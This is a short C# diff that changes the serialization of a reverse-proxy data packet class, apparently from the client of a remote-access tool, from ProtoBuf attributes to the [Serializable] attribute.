@@ -1,16 +1,14 @@
-﻿using ProtoBuf;
+﻿using System;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
 
 namespace xClient.Core.ReverseProxy.Packets
 {
-    [ProtoContract]
+    [Serializable]
     public class ReverseProxyData : IPacket
     {
-        [ProtoMember(1)]
         public int ConnectionId { get; set; }
 
-        [ProtoMember(2)]
         public byte[] Data { get; set; }
 
         public ReverseProxyData()
